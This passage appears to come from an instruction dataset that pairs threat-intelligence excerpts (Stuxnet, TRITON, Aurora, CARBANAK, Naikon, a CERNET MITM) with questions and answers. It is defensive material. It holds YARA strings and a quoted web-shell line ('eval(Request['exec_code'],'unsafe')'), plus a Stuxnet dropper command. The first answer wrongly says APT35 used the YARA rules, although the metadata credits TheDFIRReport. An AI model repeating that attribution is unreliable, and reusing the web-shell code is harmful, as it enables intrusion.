Culture=neutral,\nPublicKeyToken=b77a5c561934e089\" fullword ascii $s13 = \"ZSystem.WorkflowServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" fullword ascii\n$s14 = \"WSystem.IdentityModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" fullword ascii\n$s15 = \"aSystem.ServiceModel.Activation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" fullword ascii\n$s16 =\n\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" wide /* base64 encoded string '' */\n$s17 = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" wide /* base64 encoded string '' */\n$s18 = \"aSystem.Web.ApplicationServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\" fullword ascii\n$s19 = \"\\\\System.EnterpriseServices, Version=4.0.0.0, Culture=neutral, fullword ascii\nPublicKeyToken=b03f5f7f11d50a3a\" $s20 = \"SMicrosoft.CSharp, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 2000KB and\n1 of ($x*) and 4 of them\n}\nmeta:\ndescription = \"9893_files - from files user.exe, task_update.exe\" author = \"TheDFIRReport\" reference = \"https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell/\" date = \"2022-03-21\"\nhash1 = \"7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b\"\nhash2 = \"12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a\"\nstrings:\n$s1 = \"-InitOnceExecuteOnce\" fullword ascii\n$s2 = \"PB_GadgetStack_%I64i\" fullword ascii\n$s3 = \"PB_DropAccept\" fullword ascii\n$s4 = \"PB_PostEventMessage\" fullword ascii $s5 = \"PB_WindowID\" fullword ascii\n$s6 = \"?GetLongPathNameA\" fullword ascii\n$s7 = \"Memory page error\" fullword ascii\n$s8 = \"PPPPPPH\" fullword ascii\n$s9 = \"YZAXAYH\" fullword ascii\n$s10 = \"%d:%I64d:%I64d:%I64d\" fullword ascii\n}\n\nQ: Why did APT35 use specific YARA rules to identify malicious files such as dhvqx.aspx and aspx_dyukbdcxjfi.aspx? How do these rules help in detecting and mitigating threats?",
    "output": "A: APT35 used specific YARA rules to identify malicious files such as dhvqx.aspx and aspx_dyukbdcxjfi.aspx to detect the presence of known malicious code patterns. These rules include conditions based on file size, specific strings, and file signatures. For example, the rule for dhvqx.aspx looks for strings like 'eval(Request[\\'exec_code\\'],\\'unsafe\\');Response.End;' and '<script language=\\'JScript\\' runat=\\'server\\'>', which are indicative of malicious behavior. Similarly, the rule for aspx_dyukbdcxjfi.aspx looks for strings related to command execution and file manipulation. By using these rules, security experts can quickly identify and respond to potential threats, thereby mitigating the risk of further compromise.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 3.1.2 Metasploit and WebDAV Exploit\nA few days after the public debate concerning .LNK PoC exploitation, the Metasploit Framework released code including implementation of the exploit in order to allow remote attacks (), Prior to the release of this exploit, it was believed that this vulnerability is not exploitable for remote attacks. Researchers from the Metasploit Project showed that this was not the case, by using the UNC path to the WebDAV service (). This vulnerability is still functional. This exploit used a WebDAV service that can be used to execute an arbitrary payload when accessed as a UNC path by following the link generated by Metasploit that displays the directory containing .LNK file and DLL module with payload.\nThe .LNK file contains the network path to the module with the payload.\nThe vulnerability in .LNK files and the recently discovered DLL Hijacking vulnerability () have much in common, both in the nature of their appearance, and in the ways in which they've been exploited.\nSmall Headline: 3.1.3 What Do DLL Hijacking Flaws and the LNK Exploit have in Common?\nWhile we have been writing this report public information was released about DLL Hijacking flaws (Microsoft Security Advisory 2269637) and we noted some association with or resemblance to the .LNK files vulnerability. Both vulnerabilities are inherent design flaws and in both cases the function LoadLibrary() is used. The directory where the exploitative file is found can be situated in a USB drive, an extracted archive, or a remote network share. In both cases we find spoofed paths to a loadable module and the possibility of a remote attack via the WebDAV service.\nWhat other vulnerabilities are stored in Windows operating systems, nobody knows. Most likely, this vector of attack will undergo a thorough research and it might be that something else equally interesting is awaiting us in the near future.\nMedium Headline: 3.2 LNK Vulnerability in Stuxnet\nThis is the first way in which the rootkit distributes itself. When you inspect a flash USB drive infected with the Stuxnet worm you can expect to find 6 files there as on the following screenshot:\nCopy of Shortcut to.lnk;\nCopy of Copy of Shortcut to.lnk;\nCopy of Copy of Copy of Shortcut to.lnk;\nCopy of Copy of Copy of Copy of Shortcut to.lnk;\n~WTR4141.TMP;\n~WTR4132.TMP.\nThe first four files are LNK files \u2013 these are the files that specify how the Icon of other files should be displayed. The files with LNK extension are different: here is an example of the contents of one of them:\nThe worm exploits the CVE-2010-2568 vulnerability (see section for details) to infect the system. You can see in the figure above the highlighted name of the module to be loaded during the exploitation of the vulnerability. When a user tries to open an infected USB flash drive with an application that can display icons for shortcuts, the file with the name ~WTR4141.TMP is loaded and its entry point is called. The file is, in fact, a dynamic link library, the main purpose of which is to load another file with the name ~WTR4132.TMP from the infected flash drive.\nThe files with the .LNK filename extension are essentially the same except they specify different paths to the single file:\n\\\\.\\STORAGE#Volume#_??_USBSTOR#Disk&Ven_____USB&Prod_FLASH_DRIVE&Rev_#1 2345000100000000173&0#{53f56307-b6bf-11d0-94f2-00a0c91efb8b}#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\\~WTR4141.tmp;\n\\\\.\\STORAGE#Volume#1&19f7e59c&0&_??_USBSTOR#Disk&Ven_____USB&Prod_FLASH _DRIVE&Rev_#12345000100000000173&0#{53f56307-b6bf-11d0-94f2-00a0c91efb8b}#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\\~WTR4141.tmp;\n\\\\.\\STORAGE#RemovableMedia#8&1c5235dc&0&RM#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\\~WTR4141.tmp;\n\\\\.\\STORAGE#RemovableMedia#7&1c5235dc&0&RM#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\\~WTR4141.tmp.\nAll these strings specify a path to the file located on the removable drive, and are used instead of a short form of the path with a drive letter. The first part of the path to the file (before the backslash \"\\\" that precedes the filename) is a symbolic link name referring to the corresponding volume, as we can see on the figure below:\nThe first entry in figure 3.12 corresponds to the volume representing a USB flash drive, the name of which is \\Device\\HarddiskVolume5. Notably, that drive letters are symbolic link names too that refer to the same device objects:\nStuxnet uses the long versions of pathnames because it is impossible to predict what letter corresponds to a removable drive in a remote system, and as a result, the short paths are likely to be incorrect in some cases. The longer variant of a path is constructed with respect to certain rules and configuration information obtained from the hardware, so that we can predict with considerable accuracy what symbolic link name corresponds to a device on a remote machine.\nThe rules according to which these symbolic links are constructed vary depending on the operating system, which is why Stuxnet uses four distinct .LNK files. For instance, the first entry in the list presented above won't work on Windows XP but will work on Windows 7, the second entry works on Windows Vista, while the last two entries work on Windows XP, Windows Server 2003 and Windows 2000.\nMedium Headline: 3.3 The MS10-061 Attack Vector\nAnother way in which the worm replicates itself over the network exploits a vulnerability in Window Spooler (MS10-061). Machines with file and printer sharing turned on are vulnerable to the attack. This vulnerability results in privilege escalation allowing a remote user using a Guest account to write into %SYSTEM% directory of the target machine.\nThe attack is performed in two stages: during the first stage the worm copies the dropper and additional file into Windows\\System32\\winsta.exe and Windows\\System32\\wbem\\mof\\sysnullevnt.mof respectively, while at the second stage the dropper is executed.\nThe first stage exploits the MS10-061 vulnerability. Under certain conditions the spooler improperly impersonates a client that sends two \"documents\" for printing as we can see on the figure below.\nThese documents are \"printed\" to files in the %SYSTEM% directory while a user has Guest privileges that shouldn't entail access rights to the %SYSTEM% directory. During exploitation of the vulnerability, a thread of the process spoolsv.exe calls an API function StartDocPrinter() with parameter specifying the following information about document to be printed:\ntypedef struct _DOC_INFO_1 {\n} DOC_INFO_1;\nIn the middle of September 2010, Microsoft released a security patch to fix MS10-061. We have compared the original executable spoolsv.exe with the patched executable and found some functional differences. One of the most important differences concerns the YStartDocPrinter function which is eventually called in order to print a document. On the figure below we provide a graphical representation of the functions.\nThe left-hand side represents the patched function while on the right-hand the original is displayed. The functions are in general the same, but some additional checks have been added, and these are highlighted in red. Before printing a document the function performs the following checks:\nwhether the caller belongs to Local group;\nwhether OutputFile parameter is NULL or equal to a port name of the printer: otherwise\na client needs to have appropriate access rights to write to the specified file.\nThe sequence of check is presented on the figure below.\nThe second stage of the attack employs the file wbem\\mof\\sysnullevnt.mof : that is, a Managed Object Format file. Files of this type are used to create or register providers, events, and event categories for WMI. Under certain conditions this file runs winsta.exe (the dropper) and its execution by the system results in the infection of the system.\nMedium Headline: 3.4 Network Shared Folders And RPC Vulnerability (MS08-067)\nThe worm is also capable of distributing itself over the network through shared folders. It scans network shares c$ and admin$ on the remote computers and installs a file (dropper) there with the name DEFRAG<GetTickCount>.TMP, and schedules a task to be executed on the next day:\nrundll.exe \"C:\\addins\\DEFRAGdc2d0.TMP\", DllGetClassObject\nStuxnet's exploitation of the MS08-67 vulnerability to propagate itself through the network is comparable to the use of the same vulnerability by the network worm Conficker. Its exploit is implemented as a separate module. We have compared the two exploit implementations in Conficker and Stuxnet and found that the shell codes that have been used are different. Stuxnet's shell code is rather sophisticated and employs advanced techniques that have recently become widely spread such as ROP (return oriented programming).\nRead the text above and answer this question: How does the Metasploit Framework's implementation of the .LNK PoC exploit enable remote attacks, and what role does the WebDAV service play in this process?",
    "output": "The Metasploit Framework's implementation of the .LNK PoC exploit enables remote attacks by using the UNC path to the WebDAV service. This exploit involves a WebDAV service that can execute an arbitrary payload when accessed as a UNC path. The .LNK file contains the network path to the module with the payload. When a user follows the link generated by Metasploit, which displays the directory containing the .LNK file and DLL module with the payload, the payload is executed. This vulnerability remains functional and demonstrates that the .LNK file vulnerability can indeed be exploited remotely.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Incident Summary\nThe attacker gained remote access to an SIS engineering workstation and deployed the TRITON attack framework to reprogram the SIS controllers. During the incident, some SIS controllers entered a failed safe state, which automatically shutdown the industrial process and prompted the asset owner to initiate an investigation. The investigation found that the SIS controllers initiated a safe shutdown when application code between redundant processing units failed a validation check -- resulting in an MP diagnostic failure message.\nWe assess with moderate confidence that the attacker inadvertently shutdown operations while developing the ability to cause physical damage for the following reasons:\nModifying the SIS could prevent it from functioning correctly, increasing the likelihood of a failure that would result in physical consequences.\nTRITON was used to modify application memory on SIS controllers in the environment, which could have led to a failed validation check.\nThe failure occurred during the time period when TRITON was used.\nIt is not likely that existing or external conditions, in isolation, caused a fault during the time of the incident.\nBig Headline: Attribution\nhas not connected this activity to any actor we currently track; however, we assess with moderate confidence that the actor is sponsored by a nation state. The targeting of critical infrastructure as well as the attacker's persistence, lack of any clear monetary goal and the technical resources necessary to create the attack framework suggest a well-resourced nation state actor. Specifically, the following facts support this assessment:\nThe attacker targeted the SIS suggesting an interest in causing a high-impact attack with physical consequences. This is an attack objective not typically seen from cyber-crime groups.\nThe attacker deployed TRITON shortly after gaining access to the SIS system, indicating that they had pre-built and tested the tool which would require access to hardware and software that is not widely available. TRITON is also designed to communicate using the proprietary TriStation protocol which is not publicly documented suggesting the adversary independently reverse engineered this protocol.\nThe targeting of critical infrastructure to disrupt, degrade, or destroy systems is consistent with numerous attack and reconnaissance activities carried out globally by Russian, Iranian, North Korean, U.S., and Israeli nation state actors. Intrusions of this nature do not necessarily indicate an immediate intent to disrupt targeted systems, and may be preparation for a contingency.\nBig Headline: Background on Process Control and Safety Instrumented Systems\nModern industrial process control and automation systems rely on a variety of sophisticated control systems and safety functions. These systems and functions are often referred to as or Operational Technology (OT).\nA Distributed Control System (DCS) provides human operators with the ability to remotely monitor and control an industrial process. It is a computerized control system consisting of computers, software applications and controllers. An Engineering Workstation is a computer used for configuration, maintenance and diagnostics of the control system applications and other control system equipment.\nA SIS is an autonomous control system that independently monitors the status of the process under control. If the process exceeds the parameters that define a hazardous state, the SIS attempts to bring the process back into a safe state or automatically performs a safe shutdown of the process. If the SIS and DCS controls fail, the final line of defense is the design of the industrial facility, which includes mechanical protections on equipment (e.g. rupture discs), physical alarms, emergency response procedures and other mechanisms to mitigate\ndangerous situations.\nAsset owners employ varied approaches to interface their plant's DCS with the SIS. The traditional approach relies on the principles of segregation for both communication infrastructures and control strategies. For at least the past decade, there has been a trend towards integrating DCS and SIS designs for various reasons including lower cost, ease of use, and benefits achieved from exchanging information between the DCS and SIS. We believe TRITON acutely demonstrates the risk associated with integrated designs that allow bidirectional communication between DCS and SIS network hosts.\nBig Headline: Safety Instrumented Systems Threat Model and Attack Scenarios\nThe attack lifecycle for disruptive attacks against ICS is similar to other types of cyber attacks, with a few key distinctions. First, the attacker's mission is to disrupt an operational process rather than steal data. Second, the attacker must have performed OT reconnaissance and have sufficient specialized engineering knowledge to understand the industrial process being controlled and successfully manipulate it.\nFigure 2 represents the relationship between cyber security and safety controls in a process control environment. Even if cyber security measures fail, safety controls are designed to prevent physical damage. To maximize physical impact, a cyber attacker would also need to bypass safety controls.\nThe SIS threat model below highlights some of the options available to an attacker who has successfully compromised an SIS.\nAttack Option 1: Use the SIS to shutdown the process\nThe attacker can reprogram the SIS logic to cause it to trip and shutdown a process that is, in actuality, in a safe state. In other words, trigger a false positive.\nImplication: Financial losses due to process downtime and complex plant start up procedure after the shutdown.\nAttack Option 2: Reprogram the SIS to allow an unsafe state\nThe attacker can reprogram the SIS logic to allow unsafe conditions to persist.\nImplication: Increased risk that a hazardous situation will cause physical consequences (e.g. impact to equipment, product, environment and human safety) due to a loss of SIS functionality.\nAttack Option 3: Reprogram the SIS to allow an unsafe state \u2013 while using the DCS to create an unsafe state or hazard\nThe attacker can manipulate the process into an unsafe state from the DCS while preventing the SIS from functioning appropriately.\nImplication: Impact to human safety, the environment, or damage to equipment, the extent of which depends on the physical constraints of the process and the plant design.\nBig Headline: Analysis of Attacker Intent\nWe assess with moderate confidence that the attacker's long-term objective was to develop the capability to cause a physical consequence. We base this on the fact that the attacker initially obtained a reliable foothold on the DCS and could have developed the capability to manipulate the process or shutdown the plant, but instead proceeded to compromise the SIS system. Compromising both the DCS and SIS system would enable the attacker to develop and carry out an attack that causes the maximum amount of damage allowed by the physical and mechanical safeguards in place.\nOnce on the SIS network, the attacker used their pre-built TRITON attack framework to interact with the SIS controllers using the TriStation protocol. The attacker could have caused a process shutdown by issuing a halt command or intentionally uploading flawed code to the SIS controller to cause it to fail. Instead, the attacker made several attempts over a period of time to develop and deliver functioning control logic for the SIS controllers in this target environment. While these attempts appear to have failed due one of the attack scripts' conditional checks, the attacker persisted with their efforts. This suggests the attacker was intent on causing a specific outcome beyond a process shutdown.\nOf note, on several occasions, we have observed evidence of long term intrusions into ICS which were not ultimately used to disrupt or disable operations. For instance, Russian operators, such as Sandworm Team, have compromised Western ICS over a multi-year period without causing a disruption.\nBig Headline: Summary of Malware Capabilities\nThe TRITON attack tool was built with a number of features, including the ability to read and write programs, read and write individual functions and query the state of the SIS controller. However, only some of these capabilities were leveraged in the trilog.exe sample (e.g. the attacker did not leverage all of TRITON's extensive reconnaissance capabilities).\nThe TRITON malware contained the capability to communicate with Triconex SIS controllers (e.g. send specific commands such as halt or read its memory content) and remotely reprogram them with an attacker-defined payload. The TRITON sample Mandiant analyzed added an attacker-provided program to the execution table of the Triconex controller. This sample left legitimate programs in place, expecting the controller to continue operating without a fault or exception. If the controller failed, TRITON would attempt to return it to a running state. If the controller did not recover within a defined time window, this sample would overwrite the malicious program with invalid data to cover its tracks.\nRead the text above and answer this question: What characteristics of the attack suggest that it was sponsored by a nation state, and why is this significant?",
    "output": "The attacker targeted the SIS, suggesting an interest in causing a high-impact attack with physical consequences, which is not typical of cyber-crime groups. The attacker deployed TRITON shortly after gaining access to the SIS system, indicating pre-built and tested tools requiring access to specialized hardware and software. Additionally, the targeting of critical infrastructure to disrupt, degrade, or destroy systems is consistent with activities carried out by nation states like Russia, Iran, North Korea, the U.S., and Israel. This is significant because it indicates a well-resourced and potentially dangerous adversary.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "CASE STUDY: OPERATION AURORA\nTriumfant has performed extensive research into the behaviors of the recent attack directed at Google called Operation Aurora.  This case study provides a detailed description of how Triumfant would detect, analyze and remediate the attack on an endpoint machine running the Triumfant agent.\nIn the interest of full disclosure, Triumfant had no direct interaction with the attack either directly on Triumfant's own endpoints or indirectly through a Triumfant customer.  The analysis is based on detailed information collected through a variety of publically available research performed by reliable sources that performed hands-on analysis of the attack. Based on this research, Triumfant is fully confident that our software would have detected the attack and built a remediation that would have restored the machine to its pre-attack condition.\nThe Operation Aurora attack falls squarely into one of the classes of attacks that Triumfant excels at detecting: targeted attacks engineered to evade traditional network and endpoint protections.  While the actual attack vector used was not exceptionally sophisticated, the attack was created to have a digital signature that would not be detected by antivirus tools.  The attack also took steps to protect and obscure itself from detection once it infected a machine. The case study steps through the process in four parts: initial detection, diagnosis, the assimilation of data about the attack into the Triumfant knowledge base, and remediation of the affected machine.\nBig Headline: Detection\nThe malicious code used by Operation Aurora created several service keys during three specific steps: execution of the dropper, the first stage of installation, and the second stage of installation. Some of these keys are subsequently deleted but at least one was persistent. The appearance of one or more of these keys would be interpreted as a marker of potential malicious activity by the Triumfant real-time malware scan and would therefore trigger the detection process.\nThe first step in the detection process would be a request by the agent to the server requesting permission for the agent to execute a full scan of the machine. The purpose of this scan is to capture all of the changes to that machine since the previous scan results were processed as part of the normal agent/server interaction that occurs every 24 hours. The Triumfant server would respond within seconds, authorizing the scan and throttling up the agent to complete the scan as rapidly as possible, collecting all 200,000 plus attributes in under a minute.  The resulting scan would captures the state of the machine immediately after infection, providing the raw material for diagnosis so the analytics could verify the machine is under attack and identify all of the primary and secondary artifacts of the attack.\nBig Headline: Diagnosis\nThe Triumfant server would receive the full scan, recognize that it was executed as a result of suspicious behavior, and immediately compare it to the adaptive reference model (the unique context built by our patented analytics). The result of this comparison would be a set of anomalous files and registry keys. The fact that the files and keys associated with Operation Aurora have random names would guarantee that they would be perceived as anomalous despite the fact that humans might tend to confuse them with legitimate Windows services. Further analysis would then be applied to the anomaly set to identify important characteristics and functional impacts. In this case the salient characteristics are an anomalous service and a number of anomalous system32 files.\nThe discovery of an anomalous service would cause the Triumfant server to build a probe to be sent to the agent for execution to gather more data to complete the analysis.  In this case, the probe would contain a list of all of the anomalous attributes found by the server during its analysis. Such probes leverage a series of correlation functions designed to partition the anomalous attributes associated with an attack into related groups. For Operation Aurora these correlation functions would group all of the anomalous attributes and then perform a risk assessment on this group.  In this specific case, this analysis would find that the malicious attack is communicating over the internet.\nThe cumulative results of the correlation and risk assessment would then be sent back to the Triumfant server. This new information is then processed and classified as an \"Anomalous Application\" with a complete analysis of the changes that composed the attack. This data would show the full set of changes associated with the attack such as files, registry keys,\nprocesses, ports, services, and event logs that were added, changed, or deleted as part of the attack. The data about the attacks would be posted at the console and the Triumfant server would alert the appropriate personnel based on the established reporting and alert protocols. Personnel could then access the correlated attack information and the corresponding risk assessment who could then take appropriate actions including the ability to save the analysis to readily share the data with CIRT and forensics teams.\nBig Headline: Knowledge Base\nTriumfant has the ability to save the analysis from any anomalous activity and leverage that data to create what Triumfant calls a Recognition Filter that becomes a permanent part of the knowledge base contained in the adaptive reference model. These Recognition Filters have a number of benefits. First, they provide a very precise mechanism for storing and sharing knowledge about an incident. Second, they allow the system to search for any other instances of that particular condition on other machines. Third, they enable the operator to pre-authorize automatic responses - such as automatic remediation - should that incident be detected in the future.\nIn the case of Operation Aurora, an analyst could save the analysis and build a filter specifically about this attack.  Once built, the filter could be used to check other endpoint machines (the entire population or specified groups) for infection. This mechanism uses acquired knowledge to address broad attacks before they have the chance to spread beyond their initial penetration.  These filters are also more resilient than digital signatures because they use wildcarding to continue to detect the attack even as it morphs its basic signature over time to avoid traditional signature based tools.\nBig Headline: Remediation\nThe ability to identify and correlate all of the changes associated with any attack provides a depth of information that enables Triumfant to build a contextual and situational remediation that surgically and reliably removes the components of that attack without reimaging the machine. This remediation is built to exactly match the attributes of the anomalous application, in this case Operation Aurora, on an attribute by attribute basis.\nFor Operation Aurora, Triumfant would construct a remediation to address all of the changes associated with the attack, restoring the altered attributes to their pre-attack condition.  This includes the changes Aurora makes to affected machine's configuration settings to either execute or hide itself. The files added to the machine would be deleted, and any files deleted or corrupted would be remediated using Triumfant's patent pending donor technology.ii (<>)\nQuestion: What steps does Triumfant take to diagnose an attack like Operation Aurora once suspicious behavior is detected?",
    "output": "Answer: Upon detecting suspicious behavior, Triumfant initiates a full scan of the machine to capture all changes since the last scan. The server compares this scan to the adaptive reference model, identifying anomalous files and registry keys. Further analysis is applied to these anomalies to identify key characteristics and functional impacts, such as an anomalous service and system32 files. A probe is then sent to gather more data, which is used to perform a risk assessment and classify the attack as an 'Anomalous Application'. This information is then shared with appropriate personnel for further action.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: About the Video Player\nThe CARBANAK backdoor is capable of recording video of the victim's desktop. Attackers reportedly to gain an understanding of the operational workflow of employees working at targeted banks, allowing them to successfully insert fraudulent transactions that remained undetected by the banks' verification processes. As mentioned in a previous blog post , the video data file format and the player used to view the videos appeared to be custom written. The video player, shown in Figure 1, and the C2 server for the bots were designed to work together as a pair.\nThe C2 server wraps video stream data received from a CARBANAK bot in a custom video file format that the video player understands, and writes these video files to a location on disk based on a convention assumed by the video player. The StreamVideo constructor shown in Figure 2 creates a new video file that will be populated with the video capture data received from a CARBANAK bot, prepending a header that includes the signature TAG, timestamp data, and the IP address of the infected host. This code is part of the C2 server project.\nFigure 3 shows the LoadVideo function that is part of the video player project. It validates the file type by looking for the TAG signature, then reads the timestamp values and IP address just as they were written by the C2 server code in Figure 2.\nVideo files have the extension .frm as shown in Figure 4 and Figure 5. The C2 server's CreateStreamVideo function shown in Figure 4 formats a file path following a convention defined in the MakeStreamFileName function, and then calls the StreamVideo constructor from Figure 2.\nThe video player code snippet shown in Figure 5 follows video file path convention, searching all video file directories for files with the extension .frm that have begin and end timestamps that fall within the range of the DateTime variable dt.\nAnswer this question: How does the CARBANAK backdoor utilize custom video recording and playback mechanisms to facilitate its operations, and what specific components are involved in this process?",
    "output": "The CARBANAK backdoor employs a sophisticated mechanism to record and playback video of the victim's desktop, enabling attackers to understand the operational workflow of employees at targeted banks. This allows them to insert fraudulent transactions undetected by the banks' verification processes. The video recording and playback system involves several key components. First, the CARBANAK bot captures video data from the victim's desktop and sends it to the Command and Control (C2) server. The C2 server then wraps this video stream data in a custom video file format that is understood by a custom video player. The C2 server writes these video files to a specific location on disk, following a naming convention assumed by the video player. The StreamVideo constructor in the C2 server project creates a new video file, prepending a header that includes a signature TAG, timestamp data, and the IP address of the infected host. The video player, on the other hand, uses the LoadVideo function to validate the file type by checking for the TAG signature and reads the timestamp values and IP address. Video files are saved with the .frm extension, and both the C2 server and video player follow a specific file path convention to manage these files.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Naikon APT use reconnaissance techniques to gather information about its targets?",
    "output": "Reconnaissance is a critical phase of the adversary lifecycle, where attackers gather information about their targets to plan and execute future operations. In the case of the Naikon APT, reconnaissance plays a significant role in its operations. According to the report, the Naikon APT uses various reconnaissance techniques, including network scanning and identification of target hosts, to gather information about its victims. Specifically, the APT uses a custom-built HDoor tool, which is a robust reconnaissance tool for lateral movement, supporting the identification of, interfacing with, and attacking of multiple technologies and resources. The tool allows the attackers to scan for open ports, identify network services, and even perform banner-based scanning. Furthermore, the Naikon APT also uses publicly-available tools, such as Sysinternals and Prosolve, to gather information about its targets. The APT's use of reconnaissance techniques enables it to gather valuable information about its victims, which can be used to plan and execute future attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Client and Server IP adresses\nThe analyzed capture files contain pure IPv6 traffic (CERNET is a IPv6 network) which made the analysis a bit different then usual. We do not disclose the client IP addresses for privacy reasons, but they both seem legit; one from Peking University (netname PKU6-CERNET2) and the other from Chongqing\nUniversity (CQU6-CERNET2). Both IP addresses belong to (<http://bgp.he.net/AS23910>)AS23910, named \"China Next Generation Internet CERNET2\".\nPeking University entrance, by galaygobi (Creative Commons Attribution 2.0)\nChongqing University gate, by Brooktse (Creative Commons Attribution-Share Alike 3.0)\nThe IP addresses received for www.google.com were in both cases also legit, so the MITM wasn't carried out through DNS spoofing. The Peking University client connected to 2607:f8b0:4007:804::1013\n((<http://whois.arin.net/rest/net/NET6-2607-F8B0-1/pft>)GOOGLE-IPV6 in United States) and the connection from Chongqing University went to 2404:6800:4005:805::1010 ((<http://wq.apnic.net/apnic-bin/whois.pl?searchtext=2404:6800::/32&object_type=inet6num>)GOOGLE_IPV6_AP-20080930 in Australia).\nBig Headline: Time-To-Live (TTL) Analysis\nThe Time-To-Live (TTL) values received in the IP packets from www.google.com were in both cases 248 or 249 (note: TTL is actually called \"Hop Limit\" in IPv6 nomenclature, but we prefer to use the well established term \"TTL\" anyway). The highest possible TTL value is 255, this means that the received packets haven't made more than 6 or 7 router hops before ending up at the client. However, the expected number of router hops between a server on GOOGLE-IPV6 and the client at Peking University is around 14. The low number of router hops is is a clear indication of an IP MITM taking place.\nHere is an IPv6 traceroute from AS25795 in Los Angeles towards the IP address at Peking University (generated with ARP Networks' (<http://4or6.com/traceroute?l=en>)4or6.com tool):\n#traceroute -6 2001:da8:[REDACTED]\n1 2607:f2f8:1600::1 (2607:f2f8:1600::1) 1.636 ms 1.573 ms 1.557 ms\n2 2001:504:13::1a (2001:504:13::1a) 40.381 ms 40.481 ms 40.565 ms\n3 * * *\n4 2001:252:0:302::1 (2001:252:0:302::1) 148.409 ms 148.501 ms 148.595 ms\n5 * * *\n6 2001:252:0:1::1 (2001:252:0:1::1) 148.273 ms 147.620 ms 147.596 ms\n7 pku-bj-v6.cernet2.net (2001:da8:1:1b::2) 147.574 ms 147.619 ms 147.420 ms\n8 2001:da8:1:50d::2 (2001:da8:1:50d::2) 148.582 ms 148.670 ms 148.979 ms\n9 cernet2.net (2001:da8:ac:ffff::2) 147.963 ms 147.956 ms 147.988 ms\n10 2001:da8:[REDACTED] 147.964 ms 148.035 ms 147.895 ms\n11 2001:da8:[REDACTED] 147.832 ms 147.881 ms 147.836 ms\n12 2001:da8:[REDACTED] 147.809 ms 147.707 ms 147.899 ms\nAs can be seen in the traceroute above, seven hops before the client we find the (<http://wq.apnic.net/apnic-bin/whois.pl?searchtext=2001:252::/32&object_type=inet6num>)2001:252::/32 network, which is called \"CNGI International Gateway Network (CNGIIGN)\". This network is actually part of CERNET, but on (<http://bgp.he.net/AS23911>)AS23911, which is the network that connects CERNET with its external peers. A reasonable assumption is therefore that the MITM is carried out on the 2001:252::/32 network, or where AS23910 (2001:da8:1::2) connects to AS23911 (2001:252:0:1::1). This means that the MITM attack is being conducted from within China.\nBig Headline: Response Time Analysis\nThe round-trip time between the client and server can be estimated by measuring the time from when the client sends it initial TCP SYN packet to when it receives a TCP SYN+ACK from the server. The expected round-trip time for connecting from CERNET to a Google server overseas would be around 150ms or more. However, in the captures we've analyzed the TCP SYN+ACK package was received in just 8ms (Peking) and 52ms (Chongqing) respectively. Again, this is a clear indication of an IP MITM taking place, since Google cannot possibly send a response from the US to CERNET within 8ms regardless of how fast they are. The fast response times also indicate that the machine performing the MITM is located fairly close to the network at Peking University.\nEven though the machine performing the MITM was very quick at performing the TCP tree-way handshake we noticed that the application layer communication was terribly slow. The specification for the TLS handshake ((<https://www.ietf.org/rfc/rfc2246.txt>)RFC 2246) defines that a ClientHello message should be responded to with a ServerHello. Google typically send their ServerHello response almost instantly, i.e. the response is received after one round-trip time (150ms in this case). However, in the analyzed captures we noticed ServerHello response times of around 500ms.\nBig Headline: X.509 Certificate analysis\nWe extracted the X.509 certificates from the two capture files to .cer files using (<http://networkminer.com/>)NetworkMiner. We noticed that both users received identical certificates, which were both self signed for \"google.com\". The\nfact that the MITM used a self signed certificate makes the attack easily detectable even for the nontechnical user, since the web browser will typically display a warning about the site not being trusted. Additionally the X.509 certificate was created for \"google.com\" rather than \"*.google.com\". This is an obvious miss from the MITM'ers side since they were attempting to MITM traffic to \"www.google.com\" but not to \"google.com\".\nNetworkMiner showing list of X.509 certificates extracted from the two PCAP files\nCertificate SHA1 fingerprint: f6beadb9bc02e0a152d71c318739cdecfc1c085d\nCertificate MD5 fingerprint: 66:D5:D5:6A:E9:28:51:7C:03:53:C5:E1:33:14:A8:3B\nA copy of the fake certificate is available on (<https://docs.google.com/file/d/0ByksGrIc0SXfT0p3NFpKWFlrMkE/edit>)Google drive thanks to GreatFire.org.\nBig Headline: Conclusions\nAll evidence indicates that a MITM attack is being conducted against traffic between China's nationwide education and research network CERNET and www.google.com. It looks as if the MITM is carried out on a network belonging to AS23911, which is the outer part of CERNET that peers with all external networks. This network is located in China, so we can conclude that the MITM was being done within the country.\nIt's difficult to say exactly how the MITM attack was carried out, but we can dismiss DNS spoofing as the used method. The evidence we've observed instead indicate that the MITM attack is performed either by performing (<http://en.wikipedia.org/wiki/IP_hijacking>)IP hijacking or by simply reconfiguring a router to forward the HTTPS traffic to a transparent SSL proxy. An alternative to changing the router config would also be to add an in-line device that redirects the desired traffic to the SSL proxy. However, regardless of how they did it the attacker would be\nable to decrypt and inspect the traffic going to Google.\nPosted by Erik Hjelmvik on Thursday, 04 September 2014 23:55:00 (UTC/GMT)\nQuestion: How does the analysis of the X.509 certificates provide evidence of a MITM attack, and what specific 